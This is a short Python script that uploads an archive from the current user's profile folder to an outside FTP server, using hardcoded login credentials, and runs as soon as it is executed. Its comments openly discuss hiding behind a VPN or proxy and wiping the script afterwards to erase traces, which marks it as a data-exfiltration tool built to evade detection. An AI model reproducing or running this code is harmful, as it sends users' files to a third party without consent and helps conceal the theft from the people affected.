import ftplib
import os
from ftplib import FTP



##This was completed with a filezilla server
## problem 1 was how
##problem 2 was permission problems! i needed full access on filezilla server
## to hide? vpn? proxy? maybe while delete do a dod wipe of the script!

def ftp_trans():
    logged_user_os_fix = os.environ['USERPROFILE']
    path_to_file = '{}\lmao.tar.gz'.format(logged_user_os_fix)
    ftp = FTP('joejoe1234.com',user='ubuntu',passwd='jjcool4life')
    ftp.retrlines('LIST')
    ftp.set_pasv(True)
    file = open(path_to_file,'rb')
    ftp.storbinary('STOR lmao.tar.gz',file)
    ftp.quit()
    file.close()

ftp_trans()



